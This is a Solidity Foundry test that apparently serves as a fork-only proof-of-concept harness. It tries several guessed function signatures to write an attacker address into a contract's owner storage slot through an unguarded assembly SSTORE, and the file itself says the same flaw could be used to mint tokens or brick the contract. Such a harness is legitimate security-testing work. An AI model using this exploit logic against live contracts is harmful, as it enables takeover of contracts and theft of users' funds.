// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Assembly SSTORE to a caller-chosen slot
/// @notice Detectors: assembly-sstore, assembly-param-sstore. The target
///         lets the caller pick the storage slot (or writes a fixed slot
///         from assembly) -- writing to slot 0 overwrites `owner`, to the
///         balances slot mints tokens, to the paused slot bricks the
///         contract. Storage layout is the only thing standing in the way.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh.
///
///      This harness does NOT guess a single entry point. It tries every
///      plausible assembly-write entry point and accepts the first that
///      produces the class OBSERVABLE -- the owner slot now holds the
///      attacker. A call that merely RETURNS is never treated as a
///      reproduction.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // Storage slot to overwrite (0 = owner in most contracts). Adapt to the
    // target's layout.
    uint256 public constant SLOT = 0;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function _ownerSlot() internal view returns (uint256) {
        return uint256(vm.load(target, bytes32(SLOT)));
    }

    /// Try ONE candidate and accept it only when the class OBSERVABLE
    /// changes -- never because the call returned.
    /// `before` is the owner-slot value snapshot.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        uint256 slotNow = _ownerSlot();
        console.log("tried", label, ok ? "call returned" : "call reverted");
        // OBSERVABLE (arbitrary SSTORE): the owner slot now holds the
        // attacker, and did not before. A call that merely returned without
        // moving the slot is not the write.
        if (ok && slotNow == uint256(uint160(attacker)) && before != slotNow) return label;
        return "";
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        uint256 want = uint256(uint160(attacker));
        used = _attempt(
            attacker,
            before,
            "set(uint256,uint256)",
            abi.encodeWithSignature("set(uint256,uint256)", SLOT, want)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "write(uint256,uint256)",
            abi.encodeWithSignature("write(uint256,uint256)", SLOT, want)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "store(uint256,uint256)",
            abi.encodeWithSignature("store(uint256,uint256)", SLOT, want)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "update(uint256,uint256)",
            abi.encodeWithSignature("update(uint256,uint256)", SLOT, want)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "poke(uint256,uint256)",
            abi.encodeWithSignature("poke(uint256,uint256)", SLOT, want)
        );
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        // OBSERVABLE snapshot: the owner slot.
        uint256 before = _ownerSlot();

        string memory used = _tryEntry(attackerEOA, before);

        assertTrue(
            bytes(used).length > 0,
            "not reproduced via any tried entry point. Candidates tried: set(uint256,uint256), write(uint256,uint256), store(uint256,uint256), update(uint256,uint256), poke(uint256,uint256) -- each either RETURNED (a no-op) or left the owner slot unchanged. This does NOT establish safety: the assembly write may be under another name, or SLOT may not be the owner slot. Adapt the candidate list and SLOT."
        );
        console.log("arbitrary SSTORE reproduced via", used);
        console.log("owner slot now:", address(uint160(_ownerSlot())));
    }
}
